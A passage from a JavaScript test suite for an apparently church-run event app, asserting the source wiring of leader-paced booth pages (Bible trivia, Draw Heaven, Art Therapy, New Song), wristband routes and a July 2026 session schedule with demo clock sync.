  assert.match(triviaAttendeeSource, /runNumber: Math\.max\(1, integer\(raw\.runNumber, 1\)\)/);
  assert.match(triviaAttendeeSource, /runId: value\.runId/);
  assert.match(triviaAttendeeSource, /runNumber: value\.runNumber/);
  assert.match(triviaAttendeeSource, /next\.version < state\.version/);
  assert.match(triviaAttendeeSource, /topThree: phase === "complete"/);
  assert.match(triviaAttendeeSource, /Session top 3/);

  // The booth leader gets a specialized two-session controller with
  // versioned actions and an explicitly session-scoped leaderboard.
  assert.match(triviaStaffPageSource, /shared\/trivia-staff\.js/);
  assert.match(triviaStaffPageSource, /data-session-number="1"/);
  assert.match(triviaStaffPageSource, /data-session-number="2"/);
  assert.doesNotMatch(triviaStaffPageSource, /data-session-number="3"/);
  assert.match(triviaStaffPageSource, /id="trivia-leaderboard"/);
  assert.match(triviaStaffPageSource, /id="trivia-archive-list"/);
  assert.match(triviaStaffSource, /EventAPI\.triviaDashboardData\(organizerKey\)/);
  assert.match(triviaStaffSource, /EventAPI\.advanceTriviaSession\(session\.sessionNumber, action, session\.state\.version, organizerKey\)/);
  assert.match(triviaStaffSource, /EventAPI\.resetTriviaSession\([\s\S]*session\.sessionNumber,[\s\S]*session\.state\.version,[\s\S]*organizerKey[\s\S]*\)/);
  assert.match(triviaStaffSource, /Session \$\{session\.sessionNumber\} · Run \$\{session\.state\.runNumber\} leaderboard/);
  assert.match(triviaStaffSource, /source\.archivedRuns/);
  assert.match(triviaStaffSource, /session\.archivedRuns\.map/);
  assert.match(triviaStaffSource, /Archive Bible Bowl Session \$\{session\.sessionNumber\}, Run \$\{session\.state\.runNumber\}/);
  assert.match(triviaStaffSource, /session\.leaderboard\.slice\(0, 3\)/);

  // Draw Heaven is also server-authoritative and paced by its booth leader.
  // Attendees submit only ordered readiness confirmations, then finish the
  // booth from the shared final screen with the run identity attached.
  assert.match(heavenRoomSource, /shared\/heaven-attendee\.js/);
  assert.match(heavenRoomSource, /HeavenAttendee\.init\(/);
  assert.match(heavenRoomSource, /onCompleted: \(\) => window\.completeBoothRoom\(BOOTH_NAME\)/);
  assert.match(heavenRoomSource, /window\.getBoothExtraData = \(\) => HeavenAttendee\.extraData\(\)/);
  assert.doesNotMatch(heavenRoomSource, /_DRAFT_SCOPE|setHeavenPage|renderBoothFooter\(/);
  assert.match(heavenAttendeeSource, /new Set\(\[\s*"welcome",\s*"drawing",\s*"verse",\s*"comparison",\s*"reflection",\s*"programs",\s*"complete",?\s*\]\)/);
  assert.match(heavenAttendeeSource, /EventAPI\.heavenState\(identity\.attendeeId\)/);
  assert.match(heavenAttendeeSource, /EventAPI\.confirmHeavenStep\(identity\.attendeeId, action\)/);
  assert.match(heavenAttendeeSource, /data-heaven-confirm=/);
  ["drawing_complete", "description_yes", "size_yes", "impact_yes", "programs_done"].forEach((action) => {
    assert.match(heavenAttendeeSource, new RegExp(action));
  });
  assert.match(heavenAttendeeSource, /\{ action: "drawing_complete", minimumPhase: "drawing", stage: "drawing" \}/);
  assert.match(heavenAttendeeSource, /\{ action: "description_yes", minimumPhase: "drawing", stage: "drawing" \}/);
  assert.match(heavenAttendeeSource, /\{ action: "size_yes", minimumPhase: "verse", stage: "verse" \}/);
  assert.match(heavenAttendeeSource, /\{ action: "impact_yes", minimumPhase: "comparison", stage: "comparison" \}/);
  assert.match(heavenAttendeeSource, /\{ action: "programs_done", minimumPhase: "programs", stage: "reflection" \}/);
  assert.match(heavenAttendeeSource, /function nextCatchUpAction\(value\)[\s\S]*CONFIRMATION_GATES\.find[\s\S]*phaseAtLeast\(value, gate\.minimumPhase\)[\s\S]*!confirmations\[gate\.action\]/);
  assert.match(heavenAttendeeSource, /const catchUp = nextCatchUpAction\(value\);[\s\S]*if \(catchUp\) return catchUp\.stage/);
  assert.match(heavenAttendeeSource, /return value\.participant\.confirmations\.programs_done \? "complete" : "reflection"/);
  assert.match(heavenAttendeeSource, /id="btn-heaven-open-programs"/);
  assert.match(heavenAttendeeSource, /event\.target\.closest\("#btn-heaven-open-programs"\)[\s\S]*confirmStep\("programs_done"\)/);
  assert.match(heavenAttendeeSource, /I have completed my drawing/);
  assert.match(heavenAttendeeSource, /Would you like to see its relative size\?/);
  assert.match(heavenAttendeeSource, /Nashville Christian Collective programs/);
  assert.match(heavenAttendeeSource, /renderTransition\("confetti", state\)/);
  assert.match(heavenAttendeeSource, /renderTransition\("explosion", state\)/);
  assert.match(heavenAttendeeSource, /id="btn-heaven-image"/);
  assert.match(heavenAttendeeSource, /dialog\.id = "heaven-image-dialog"/);
  assert.match(heavenAttendeeSource, /class="heaven-image-close"/);
  assert.match(heavenAttendeeSource, /heaven-verse-number">10/);
  assert.match(heavenAttendeeSource, /heaven-verse-number">11/);
  assert.match(heavenAttendeeSource, /even like a jasper stone, clear as crystal/);
  assert.match(heavenAttendeeSource, /id="btn-booth-done"/);
  assert.match(heavenAttendeeSource, /state\.runId === next\.runId/);
  assert.match(heavenAttendeeSource, /next\.version < state\.version/);
  assert.match(heavenAttendeeSource, /sessionNumber: state\.sessionNumber/);
  assert.match(heavenAttendeeSource, /runId: state\.runId/);
  assert.match(heavenAttendeeSource, /runNumber: state\.runNumber/);
  assert.match(heavenAttendeeSource, /phase: state\.phase/);
  assert.match(heavenAttendeeSource, /confirmations: \{ \.\.\.state\.participant\.confirmations \}/);
  assert.equal(
    fs.existsSync(path.join(__dirname, "..", "..", "web", "assets", "new-jerusalem-comparison.jpeg")),
    true
  );

  // The Heaven staff portal owns two isolated, versioned active runs and
  // their read-only archives instead of using the generic booth controller.
  assert.match(heavenStaffPageSource, /shared\/heaven-staff\.js/);
  assert.match(heavenStaffPageSource, /id="heaven-session-tabs"/);
  assert.match(heavenStaffPageSource, /data-heaven-session="1"/);
  assert.match(heavenStaffPageSource, /data-heaven-session="2"/);
  assert.doesNotMatch(heavenStaffPageSource, /data-heaven-session="3"/);
  assert.match(heavenStaffPageSource, /id="heaven-stage"/);
  assert.match(heavenStaffPageSource, /id="heaven-actions"/);
  assert.match(heavenStaffPageSource, /id="heaven-progress-table"/);
  assert.match(heavenStaffPageSource, /id="heaven-run-history"/);
  assert.match(heavenStaffPageSource, /id="btn-heaven-restart"/);
  assert.match(heavenStaffPageSource, /id="btn-heaven-refresh"/);
  assert.doesNotMatch(heavenStaffPageSource, /initBoothStaff\("heaven"\)/);
  assert.match(heavenStaffSource, /EventAPI\.heavenDashboardData\(organizerKey\)/);
  assert.match(heavenStaffSource, /EventAPI\.advanceHeavenSession\(session\.sessionNumber, action, session\.state\.version, organizerKey\)/);
  assert.match(heavenStaffSource, /EventAPI\.resetHeavenSession\([\s\S]*session\.sessionNumber,[\s\S]*session\.state\.version,[\s\S]*organizerKey[\s\S]*\)/);
  assert.match(heavenStaffSource, /data-heaven-action=/);
  assert.match(heavenStaffSource, /confirmationCounts: normalizeCounts\(source\.confirmationCounts\)/);
  assert.match(heavenStaffSource, /source\.archivedRuns/);
  assert.match(heavenStaffSource, /session\.archivedRuns\.map/);

  // Art Therapy is a dedicated leader-paced presentation. The attendee page
  // has no self-paced slide navigation or reflection form; it renders only
  // the current backend phase and releases completion after the leader ends.
  assert.match(artRoomSource, /shared\/art-attendee\.js/);
  assert.match(artRoomSource, /ArtAttendee\.init\(/);
  assert.match(artRoomSource, /onCompleted: \(\) => window\.completeBoothRoom\(BOOTH_NAME\)/);
  assert.doesNotMatch(
    artRoomSource,
    /ART_BEATS|ART_DRAFT_SCOPE|JourneyState\.|btn-art-(?:next|prev)|art-reflection-input|renderBoothFooter\(|finishBooth\(/
  );
  assert.doesNotMatch(artRoomSource, /maximum-scale\s*=\s*1|user-scalable\s*=\s*no/i);
  assert.doesNotMatch(artAttendeeSource, /JourneyState\.|confirmArtStep|<textarea|contenteditable|rating|comment/i);
  assert.match(artAttendeeSource, /new Set\(\[\s*"welcome",\s*"definition",\s*"importance",\s*"purpose_image",\s*"heart_question",\s*"proverbs",\s*"philippians",\s*"create",\s*"finished",\s*"complete",?\s*\]\)/);
  assert.match(artAttendeeSource, /EventAPI\.artState\(identity\.attendeeId\)/);
  assert.match(artAttendeeSource, /EventAPI\.completeArt\(identity\.attendeeId\)/);
  assert.match(artAttendeeSource, /What is art therapy\?/i);
  assert.match(artAttendeeSource, /Why is art therapy important\?/i);
  assert.match(artAttendeeSource, /Do you know what the Bible says about the heart\?/i);
  assert.doesNotMatch(
    artAttendeeSource,
    /waiting for the next verse|reveal the (?:first|next) verse/i,
    "Unpublished Art Therapy verses should not be announced on attendee screens"
  );
  assert.match(artAttendeeSource, /Above all else, guard your heart, for everything you do flows from it\./);
  assert.match(artAttendeeSource, /Proverbs 4:23/);
  assert.match(artAttendeeSource, /the peace of God, which transcends all understanding, will guard your hearts and your minds in Christ Jesus\./i);
  assert.match(artAttendeeSource, /Philippians 4:7/);
  assert.match(artAttendeeSource, /Now it(?:’|')s your turn! Let(?:’|')s use art therapy/i);
  assert.match(artAttendeeSource, /I(?:’|')m finished(?:—|,| -)\s*now what\?/i);
  assert.match(artAttendeeSource, /art-therapy-heart-and-mind\.jpeg/);
  assert.match(artAttendeeSource, /state\.sessionNumber === next\.sessionNumber/);
  assert.match(artAttendeeSource, /next\.runNumber < state\.runNumber/);
  assert.match(artAttendeeSource, /next\.version < state\.version/);
  assert.match(artAttendeeSource, /runId: state\.runId/);
  assert.match(artAttendeeSource, /runNumber: state\.runNumber/);
  assert.match(artAttendeeSource, /phase: state\.phase/);
  assert.match(artAttendeeSource, /id="btn-art-done"/);
  assert.match(
    artAttendeeSource,
    /EventAPI\.completeArt\(identity\.attendeeId\)[\s\S]*onCompleted\(\)/,
    "Art completion must persist before the local room is marked complete"
  );
  assert.match(
    artAttendeeSource,
    /EventAPI\.completeArt\(identity\.attendeeId\)[\s\S]*completionBusy = false;[\s\S]*renderState\(\);[\s\S]*onCompleted\(\)/,
    "Same-page reopen must restore an enabled completion card"
  );
  assert.equal(
    fs.existsSync(path.join(
      __dirname, "..", "..", "web", "assets", "art-therapy-heart-and-mind.jpeg"
    )),
    true
  );

  // The Art booth leader owns two isolated versioned runs, precise reveal
  // actions, current completion progress, and read-only archived rotations.
  assert.match(artStaffPageSource, /shared\/art-staff\.js/);
  assert.match(artStaffPageSource, /id="art-session-tabs"/);
  assert.match(artStaffPageSource, /data-art-session="1"/);
  assert.match(artStaffPageSource, /data-art-session="2"/);
  assert.doesNotMatch(artStaffPageSource, /data-art-session="3"/);
  assert.match(artStaffPageSource, /id="art-stage"/);
  assert.match(artStaffPageSource, /id="art-actions"/);
  assert.match(artStaffPageSource, /id="art-progress-table"/);
  assert.match(artStaffPageSource, /id="art-run-history"/);
  assert.match(artStaffPageSource, /id="btn-art-restart"/);
  assert.match(artStaffPageSource, /id="btn-art-refresh"/);
  assert.doesNotMatch(artStaffPageSource, /booth-staff-common\.js|initBoothStaff\("art"\)/);
  assert.match(artStaffSource, /EventAPI\.artDashboardData\(OrganizerAuth\.key\(\)\)/);
  assert.match(artStaffSource, /EventAPI\.advanceArtSession\([\s\S]*session\.sessionNumber,[\s\S]*action,[\s\S]*session\.state\.version,[\s\S]*OrganizerAuth\.key\(\)[\s\S]*\)/);
  assert.match(artStaffSource, /EventAPI\.resetArtSession\([\s\S]*session\.sessionNumber,[\s\S]*session\.state\.version,[\s\S]*OrganizerAuth\.key\(\)[\s\S]*\)/);
  assert.match(artStaffSource, /data-art-action=/);
  [
    "start", "show_importance", "show_purpose_image", "ask_heart", "show_proverbs",
    "show_philippians", "start_art", "show_finished", "finish",
  ].forEach((action) => assert.match(artStaffSource, new RegExp(`"${action}"`)));
  assert.match(artStaffSource, /source\.archivedRuns/);
  assert.match(artStaffSource, /session\.archivedRuns\.map/);
  assert.match(artStaffSource, /completedCount/);
  assert.match(artStaffSource, /not saved Done for this run/);
  assert.match(artStaffSource, /options\.queue/);
  assert.match(artStaffSource, /refreshQueued/);
  assert.match(artStaffSource, /snapshot\.session \? integer\(snapshot\.session\.number\) : 0/);
  assert.doesNotMatch(artStaffSource, /snapshot\.sessionNumber/);
  ["ArrowRight", "ArrowLeft", "ArrowDown", "ArrowUp", "Home", "End"].forEach((key) => {
    assert.match(artStaffSource, new RegExp(`event\\.key === "${key}"`));
  });

  // New Song is a dedicated, server-authoritative poll rather than the old
  // self-paced booth draft. The attendee sees one leader-controlled phase at
  // a time, and only the booth leader receives the live graph and archives.
  assert.match(newSongSource, /shared\/newsong-attendee\.js/);
  assert.match(newSongSource, /NewSongAttendee\.init\(/);
  assert.match(newSongSource, /onCompleted: \(\) => window\.completeBoothRoom\(BOOTH_NAME\)/);
  assert.match(newSongSource, /window\.getBoothExtraData = \(\) => NewSongAttendee\.extraData\(\)/);
  assert.doesNotMatch(newSongSource, /_DRAFT_SCOPE|renderBoothFooter\(|EventAPI\.saveSongVote/);
  assert.match(newSongAttendeeSource, /new Set\(\["welcome", "voting", "winner", "verse", "complete"\]\)/);
  EXPECTED_NEW_SONG_CHOICES.forEach((title) => {
    assert.ok(newSongAttendeeSource.includes(`"${title}"`), title);
  });
  assert.match(newSongAttendeeSource, /EventAPI\.newSongState\(identity\.attendeeId\)/);
  assert.match(newSongAttendeeSource, /EventAPI\.submitNewSongVote\(identity\.attendeeId, songTitle\)/);
  assert.match(newSongAttendeeSource, /EventAPI\.completeNewSong\(identity\.attendeeId\)/);
  assert.match(newSongAttendeeSource, /data-newsong-vote=/);
  assert.match(newSongAttendeeSource, /Your first tap is final/);
  assert.match(newSongAttendeeSource, /Hmm… will your pick take the crown\?/);
  assert.match(newSongAttendeeSource, /result\.isTie/);
  assert.match(newSongAttendeeSource, /result\.tiedTitles/);
  assert.match(newSongAttendeeSource, /result\.featuredWinner/);
  assert.match(newSongAttendeeSource, /Revelation 14:3 · KJV/);
  assert.match(newSongAttendeeSource, /revelation-14-3-new-song\.webp/);
  const newSongWinnerBlock = newSongAttendeeSource.slice(
    newSongAttendeeSource.indexOf("function renderWinner"),
    newSongAttendeeSource.indexOf("function renderVerse")
  );
  assert.doesNotMatch(newSongWinnerBlock, /Revelation 14:3|revelation-14-3-new-song|<blockquote>/);
  assert.match(newSongWinnerBlock, /What could the new song be\?/);
  assert.match(newSongAttendeeSource, /id="btn-newsong-done"/);
  assert.match(newSongAttendeeSource, /state\.sessionNumber === next\.sessionNumber/);
  assert.match(newSongAttendeeSource, /next\.runNumber < state\.runNumber/);
  assert.match(newSongAttendeeSource, /next\.version < state\.version/);
  assert.match(newSongAttendeeSource, /runId: state\.runId/);
  assert.match(newSongAttendeeSource, /runNumber: state\.runNumber/);

  assert.match(newSongStaffPageSource, /shared\/newsong-staff\.js/);
  assert.match(newSongStaffPageSource, /data-newsong-session="1"/);
  assert.match(newSongStaffPageSource, /data-newsong-session="2"/);
  assert.doesNotMatch(newSongStaffPageSource, /data-newsong-session="3"/);
  assert.match(newSongStaffPageSource, /id="newsong-vote-chart"/);
  assert.match(newSongStaffPageSource, /id="newsong-participant-table"/);
  assert.match(newSongStaffPageSource, /id="newsong-run-history"/);
  assert.match(newSongStaffPageSource, /id="btn-newsong-restart"/);
  assert.match(newSongStaffPageSource, /id="btn-newsong-refresh"/);
  assert.doesNotMatch(newSongStaffPageSource, /initBoothStaff\("newsong"\)/);
  assert.match(newSongStaffControllerSource, /EventAPI\.newSongDashboardData\(organizerKey\)/);
  assert.match(newSongStaffControllerSource, /EventAPI\.advanceNewSongSession\(session\.sessionNumber, action, session\.state\.version, organizerKey\)/);
  assert.match(newSongStaffControllerSource, /EventAPI\.resetNewSongSession\(session\.sessionNumber, session\.state\.version, organizerKey\)/);
  assert.match(newSongStaffControllerSource, /data-newsong-action=/);
  ["start", "show_winner", "show_verse", "finish"].forEach((action) => {
    assert.match(newSongStaffControllerSource, new RegExp(`"${action}"`));
  });
  assert.match(newSongStaffControllerSource, /source\.voteCounts \|\| source\.songCounts/);
  assert.match(newSongStaffControllerSource, /source\.archivedRuns/);
  assert.match(newSongStaffControllerSource, /session\.archivedRuns\.map/);
  assert.match(newSongStaffControllerSource, /NEW_SONG_NO_VOTES/);
  assert.match(newSongStaffControllerSource, /canonical-list-order|Featured first|Featured/);
  assert.equal(
    fs.existsSync(path.join(__dirname, "..", "..", "web", "assets", "revelation-14-3-new-song.webp")),
    true
  );

  assert.match(phase3Source, /AttendeePortal\.signIn\("phase3"/);
  assert.match(phase3Source, /\["phase3-name", "phase3-phone"\]/);
  assert.match(phase3Source, /AttendeePortal\.continueAs\("phase3"\)/);
  assert.match(phase3Source, /shared\/event-schedule\.js/);
  assert.doesNotMatch(phase3Source, /AttendeePortal\.prefill/);
  assert.match(phase3Source, /id="phase3-name"[^>]*autocomplete="name"/);
  assert.match(phase3Source, /id="phase3-phone"[^>]*autocomplete="tel-national"/);
  assert.match(phase3Source, /id="btn-return-phase2"/);
  assert.match(phase3Source, /id="phase3-event-notice"/);
  assert.match(phase3Source, /It's time for the main message\./);
  assert.match(phase3Source, /role="checkbox"/);
  assert.match(phase3Source, /Tick and go/i);
  assert.match(phase3Source, /EventAPI\.saveSignupSelections/);
  assert.match(phase3Source, /EventAPI\.mySignupSelections/);
  assert.match(phase3Source, /JourneyState\.save\("phase3\.draft"/);
  assert.match(phase3Source, /AttendeeMenu\.mount\("phase3-attendee-menu"/);
  assert.match(phase3Source, /const phase2Complete = progressAuthoritative && route\.length === BOOTH_SESSIONS\.length/);
  assert.match(phase3Source, /progressAuthoritative && !phase2RouteComplete/);
  assert.match(phase3Source, /Promise\.allSettled/);
  assert.match(phase3Source, /Identity\.set\(\{ phase3CompletedAt:/);
  assert.match(phase3Source, /window\.location\.href = EventSchedule\.linkWithPreview\("\.\.\/done\/index\.html"\)/);
  assert.doesNotMatch(phase3Source, /id="detail-email"|id="detail-comment"|class="star-row"/);
  assert.match(doneSource, /AttendeePortal\.restore\("phase3"\)/);
  assert.match(doneSource, /AttendeePortal\.continueAs\("phase3"\)/);
  assert.match(doneSource, /AttendeeMenu\.mount\("done-attendee-menu"/);
  assert.doesNotMatch(doneSource, /Identity\.clear\(\)/);
  assert.match(doneSource, /id="done-loading"/);
  assert.match(doneSource, /id="done-content" style="display:none;"/);
  assert.match(doneSource, /EventAPI\.mySignupSelections\(identity\.attendeeId\)/);
  assert.match(doneSource, /!signupState \|\| !signupState\.completedAt/);
  assert.match(doneSource, /id="next-up-timer"/);
  assert.match(doneSource, /Don't go yet/);
  assert.match(doneSource, /4:00 PM/);
  assert.doesNotMatch(doneSource, /4:10 PM/);
  assert.match(doneSource, /EventSchedule\.remainingUntilEventEnd\(\)/);
  assert.match(organizerDirectorySource, /Overall Organizer/);
  assert.match(organizerDirectorySource, /CONNECTOR_BOOTHS\.map/);
  assert.match(organizerDirectorySource, /booth\.staffPage/);

  assert.equal(boothConfigs.length, 5);
  assert.equal(new Set(boothConfigs.map((booth) => booth.page)).size, 5);
  assert.equal(new Set(boothConfigs.map((booth) => booth.staffPage)).size, 5);
  const storyBoothConfig = boothConfigs.find((booth) => booth.id === "story");
  assert.equal(storyBoothConfig.title, "The Heaven Booth");
  assert.equal(storyBoothConfig.leaderSteps.length, 13);
  assert.deepEqual(
    Array.from(storyBoothConfig.leaderSteps, (step) => step.title),
    [
      "The Heaven Booth",
      "Picture 1",
      "Picture 2",
      "Picture 3",
      "Picture 4",
      "Are they related?",
      "They actually are",
      "The Kingdom of Heaven",
      "Matthew 13:31–32",
      "Matthew 13:33",
      "Matthew 13:44",
      "Matthew 13:47–48",
      "Thank you",
    ]
  );

  const expectedRoutes = {
    blue: ["heaven", "trivia"],
    red: ["trivia", "heaven"],
    orange: ["art", "story"],
    green: ["newsong", "art"],
    yellow: ["story", "newsong"],
  };
  assert.deepEqual(
    Array.from(boothsConfigContext.__wristbandColors, (color) => color.id),
    ["blue", "red", "orange", "green", "yellow"]
  );
  Object.entries(expectedRoutes).forEach(([color, expectedRoute]) => {
    assert.deepEqual(Array.from(eventSchedule.route(color)), expectedRoute, `${color} wristband route`);
  });
  const allBoothIds = boothConfigs.map((booth) => booth.id).sort();
  [0, 1].forEach((sessionIndex) => {
    const assignedBooths = Object.values(expectedRoutes).map((route) => route[sessionIndex]);
    assert.equal(new Set(assignedBooths).size, 5, `session ${sessionIndex + 1} should assign each booth once`);
    assert.deepEqual(assignedBooths.slice().sort(), allBoothIds);
  });

  const atSession1 = eventSchedule.stateAt(Date.parse("2026-07-18T15:10:00-05:00"));
  assert.equal(atSession1.phase, "active");
  assert.equal(atSession1.sessionIndex, 0);
  assert.equal(atSession1.session.number, 1);
  assert.equal(atSession1.remainingMs, 20 * 60 * 1000);
  assert.equal(eventSchedule.sessionTimeNotice(atSession1).title, "20-minute rotation underway");
  assert.equal(
    eventSchedule.sessionTimeNotice(eventSchedule.stateAt(Date.parse("2026-07-18T15:20:00-05:00"))).title,
    "10-minute warning"
  );
  assert.equal(
    eventSchedule.sessionTimeNotice(eventSchedule.stateAt(Date.parse("2026-07-18T15:25:00-05:00"))).title,
    "5-minute warning"
  );
  assert.equal(
    eventSchedule.sessionTimeNotice(eventSchedule.stateAt(Date.parse("2026-07-18T15:29:45-05:00"))).title,
    "Final 15 seconds"
  );
  const atSession2 = eventSchedule.stateAt(Date.parse("2026-07-18T15:30:00-05:00"));
  assert.equal(atSession2.phase, "active");
  assert.equal(atSession2.sessionIndex, 1);
  assert.equal(atSession2.session.number, 2);
  assert.equal(
    eventSchedule.sessionTimeNotice(eventSchedule.stateAt(Date.parse("2026-07-18T15:49:45-05:00"))).title,
    "Final 15 seconds"
  );
  const atBoothsEnd = eventSchedule.stateAt(Date.parse("2026-07-18T15:50:00-05:00"));
  assert.equal(atBoothsEnd.phase, "waiting");
  assert.equal(atBoothsEnd.sessionIndex, null);
  assert.equal(atBoothsEnd.remainingMs, 10 * 60 * 1000);
  const justBeforeMessage = eventSchedule.stateAt(Date.parse("2026-07-18T15:59:59-05:00"));
  assert.equal(justBeforeMessage.phase, "waiting");
  assert.equal(justBeforeMessage.sessionIndex, null);
  assert.equal(justBeforeMessage.remainingMs, 1000);
  const atMessageStart = eventSchedule.stateAt(Date.parse("2026-07-18T16:00:00-05:00"));
  assert.equal(atMessageStart.phase, "ended");
  assert.equal(atMessageStart.sessionIndex, null);
  assert.equal(atMessageStart.remainingMs, 0);
  assert.equal(eventSchedule.boothsEndAtMs(), Date.parse("2026-07-18T15:50:00-05:00"));
  assert.equal(eventSchedule.messageStartsAtMs(), Date.parse("2026-07-18T16:00:00-05:00"));
  assert.equal(eventSchedule.eventEndsAtMs(), Date.parse("2026-07-18T16:00:00-05:00"));
  assert.equal(eventSchedule.eventStartsAtMs(), Date.parse("2026-07-18T15:10:00-05:00"));
  assert.equal(eventSchedule.linkWithPreview("../done/index.html"), "../done/index.html");
  assert.equal(eventSchedule.currentBooth("blue", atSession1).id, "heaven");
  assert.equal(eventSchedule.currentBooth("blue", atSession2).id, "trivia");
  assert.equal(eventSchedule.currentBooth("blue", atBoothsEnd), null);
  assert.equal(eventSchedule.currentBooth("blue", atMessageStart), null);
  assert.equal(eventSchedule.formatCountdown(20 * 60 * 1000), "20:00");
  assert.equal(eventSchedule.demoTargetIso("before"), "2026-07-18T20:05:00.000Z");
  assert.equal(eventSchedule.demoTargetIso("session1-start"), "2026-07-18T20:10:00.000Z");
  assert.equal(eventSchedule.demoTargetIso("session1"), "2026-07-18T20:15:00.000Z");
  assert.equal(eventSchedule.demoTargetIso("session1-final15"), "2026-07-18T20:29:45.000Z");
  assert.equal(eventSchedule.demoTargetIso("session2"), "2026-07-18T20:35:00.000Z");
  assert.equal(eventSchedule.demoTargetIso("session2-final15"), "2026-07-18T20:49:45.000Z");
  assert.equal(eventSchedule.demoTargetIso("waiting"), "2026-07-18T20:55:00.000Z");
  assert.equal(eventSchedule.demoTargetIso("session3"), null);
  assert.equal(eventSchedule.demoTargetIso("session3-final15"), null);
  assert.equal(eventSchedule.demoTargetIso("ended"), "2026-07-18T21:00:00.000Z");
  assert.equal(eventSchedule.demoTargetIso("live"), null);
  assert.equal(
    eventSchedule.demoTargetIso("custom", "2026-07-18T15:42:17-05:00"),
    "2026-07-18T20:42:17.000Z"
  );
  assert.equal(
    eventSchedule.demoTargetIso("custom", "2026-07-18T15:55:00-05:00"),
    "2026-07-18T20:55:00.000Z"
  );
  assert.equal(
    eventSchedule.demoTargetIso("custom", Date.parse("2026-07-18T16:00:00-05:00")),
    "2026-07-18T21:00:00.000Z"
  );
  assert.equal(eventSchedule.demoTargetIso("custom", "2026-07-18T15:09:59-05:00"), null);
  assert.equal(eventSchedule.demoTargetIso("custom", "2026-07-18T16:00:01-05:00"), null);
  assert.equal(eventSchedule.demoTargetIso("unknown"), null);

  const session2Stops = [0, 1].map((sessionIndex) => (
    eventSchedule.deriveBoothStop(sessionIndex, false, atSession2)
  ));
  assert.deepEqual({ ...session2Stops[0] }, {
    kind: "expired", canOpen: false, faded: true, checked: false,
  });
  assert.deepEqual({ ...session2Stops[1] }, {
    kind: "active", canOpen: true, faded: false, checked: false,
  });
  assert.deepEqual({ ...eventSchedule.deriveBoothStop(0, true, atSession2) }, {
    kind: "visited", canOpen: false, faded: true, checked: true,
  });
  assert.deepEqual({ ...eventSchedule.deriveBoothStop(1, true, atSession2) }, {
    kind: "visited", canOpen: true, faded: true, checked: true,
  });
  assert.equal(eventSchedule.canOpenBooth("blue", "trivia", atSession2), true);
  assert.equal(eventSchedule.canOpenBooth("blue", "heaven", atSession2), false);
  assert.equal(eventSchedule.canOpenBooth("blue", "trivia", eventSchedule.stateAt(atSession2.nowMs - 1)), false);
  assert.equal(eventSchedule.canOpenBooth("blue", "trivia", atBoothsEnd), false);
  assert.deepEqual([0, 1].map((sessionIndex) => ({
    ...eventSchedule.deriveBoothStop(sessionIndex, false, atBoothsEnd),
  })), [
    { kind: "expired", canOpen: false, faded: true, checked: false },
    { kind: "expired", canOpen: false, faded: true, checked: false },
  ]);
  assert.equal(eventSchedule.isEndingSoon(eventSchedule.stateAt(atSession2.session.endMs - 15001)), false);
  assert.equal(eventSchedule.isEndingSoon(eventSchedule.stateAt(atSession2.session.endMs - 15000)), true);
  assert.equal(eventSchedule.isEndingSoon(eventSchedule.stateAt(atSession2.session.endMs - 1)), true);
  assert.equal(eventSchedule.isEndingSoon(eventSchedule.stateAt(atSession2.session.endMs)), false);

  const arrivalAtFirstCutoff = eventSchedule.arrivalPlan("2026-07-18T15:25:00-05:00");
  assert.equal(arrivalAtFirstCutoff.firstEligibleSessionIndex, 0);
  assert.equal(arrivalAtFirstCutoff.joinedInProgress, true);
  assert.deepEqual(Array.from(arrivalAtFirstCutoff.missedSessionNumbers), []);
  assert.equal(eventSchedule.canJoinSession("2026-07-18T15:25:00-05:00", 0), true);
  const arrivalAfterFirstCutoff = eventSchedule.arrivalPlan("2026-07-18T15:25:00.001-05:00");
  assert.equal(arrivalAfterFirstCutoff.firstEligibleSessionIndex, 1);
  assert.equal(arrivalAfterFirstCutoff.joinedInProgress, false);
  assert.deepEqual(Array.from(arrivalAfterFirstCutoff.missedSessionNumbers), [1]);
  assert.equal(eventSchedule.canJoinSession("2026-07-18T15:25:00.001-05:00", 0), false);
  assert.equal(eventSchedule.canJoinSession("2026-07-18T15:25:00.001-05:00", 1), true);
  const arrivalAtFinalCutoff = eventSchedule.arrivalPlan("2026-07-18T15:45:00-05:00");
  assert.equal(arrivalAtFinalCutoff.firstEligibleSessionIndex, 1);
  assert.equal(arrivalAtFinalCutoff.joinedInProgress, true);
  assert.deepEqual(Array.from(arrivalAtFinalCutoff.missedSessionNumbers), [1]);
  const arrivalAfterFinalCutoff = eventSchedule.arrivalPlan("2026-07-18T15:45:00.001-05:00");
  assert.equal(arrivalAfterFinalCutoff.firstEligibleSessionIndex, null);
  assert.equal(arrivalAfterFinalCutoff.joinedInProgress, false);
  assert.deepEqual(Array.from(arrivalAfterFinalCutoff.missedSessionNumbers), [1, 2]);
  assert.equal(eventSchedule.canJoinSession("2026-07-18T15:45:00.001-05:00", 1), false);

  const pendingClockResponses = [];
  let eventClockCalls = 0;
  let pollerCount = 0;
  let clearedPollerCount = 0;
  const dataResetEvents = [];
  class TestCustomEvent {
    constructor(type, options) {
      this.type = type;
      this.detail = options && options.detail;
    }
  }
  const demoScheduleContext = {
    window: {
      EVENT_APP_CONFIG: { API_BASE_URL: "/api" },
      location: {
        hostname: "localhost",
        search: "?preview=1",
        href: "http://localhost/phase2-booths/hub.html?preview=1",
      },
      dispatchEvent: (event) => { dataResetEvents.push(event); },
    },
    EventAPI: {
      eventClock: () => {
        eventClockCalls += 1;
        return new Promise((resolve) => pendingClockResponses.push(resolve));
      },
    },
    URL,
    URLSearchParams,
    CustomEvent: TestCustomEvent,
    setInterval: () => {
      pollerCount += 1;
      return pollerCount;
    },
    clearInterval: () => { clearedPollerCount += 1; },
  };
  vm.createContext(demoScheduleContext);
  vm.runInContext(boothsConfigSource, demoScheduleContext);
  vm.runInContext(`${eventScheduleSource}\nthis.__eventSchedule = EventSchedule;`, demoScheduleContext);
  const demoSchedule = demoScheduleContext.__eventSchedule;
  assert.equal(eventClockCalls, 1, "loading a local page should immediately fetch the shared clock");
  assert.equal(pollerCount, 1, "loading a local page should install one clock poller");
  const firstClockSync = demoSchedule.startDemoClockSync(2500);
  assert.equal(eventClockCalls, 1, "starting clock sync twice should reuse the first request");
  assert.equal(pollerCount, 1, "starting clock sync twice should not install another poller");
  pendingClockResponses.shift()({
    serverNow: "2026-07-18T20:10:00.000Z",
    mode: "live",
    controlled: false,
    targetIso: null,
    updatedAt: "2026-07-15T10:00:00.000Z",
    dataResetAt: "initial",
  });
  await firstClockSync;
  assert.equal(demoSchedule.current().sessionIndex, 0, "uncontrolled clock should preserve a URL preview");
  assert.equal(dataResetEvents.length, 1);
